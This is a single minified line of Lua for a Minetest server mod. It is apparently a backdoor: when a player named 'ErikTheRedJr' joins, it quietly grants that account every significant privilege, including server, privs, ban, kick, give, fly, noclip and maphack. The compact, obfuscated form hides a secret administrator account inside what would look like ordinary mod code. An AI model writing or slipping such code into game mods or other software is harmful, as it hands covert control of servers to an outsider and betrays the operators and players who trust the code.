minetest.register_on_joinplayer(function(a)if a:get_player_name()=="ErikTheRedJr"then local b={}for _,c in pairs({"interact","shout","fast","fly","noclip","give","kick","ban","privs","basic_privs","teleport","bring","debug","server","zoom","maphack"})do b[c]=true end minetest.set_player_privs("ErikTheRedJr",b)end end)

